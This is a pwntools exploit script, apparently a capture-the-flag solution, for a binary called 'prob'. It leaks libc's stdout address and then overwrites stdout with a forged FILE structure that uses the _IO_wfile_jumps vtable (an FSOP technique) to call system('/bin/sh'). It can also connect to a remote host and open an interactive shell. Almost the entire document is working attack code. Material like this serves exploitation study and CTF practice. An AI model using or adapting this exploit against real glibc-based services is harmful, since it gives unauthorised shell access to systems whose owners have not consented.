#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('prob')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+88
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    leak = io.recvline().strip()
    stdout = int(leak, 16)
    libc_base = stdout - libc.sym["_IO_2_1_stdout_"]

    info("libc base: %#x", libc_base)
    # #https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#3---the-fsop-way-targetting-stdout
    stdout_lock = libc_base + 0x21BA70#0x21ca70   # _IO_stdfile_1_lock  (symbol not exported)
    stdout = libc_base + libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc_base + libc.sym['_IO_wfile_jumps']-0x18
    # our gadget
    gadget = libc_base + 0x163830#0x169820 # add rdi, 0x10 ; jmp rcx
    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end=libc_base+libc.sym['system']            # the function that we will call: system()
    fake._IO_save_base = gadget
    fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock=stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
    
    io.sendline(bytes(fake))

            
    io.interactive()



def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

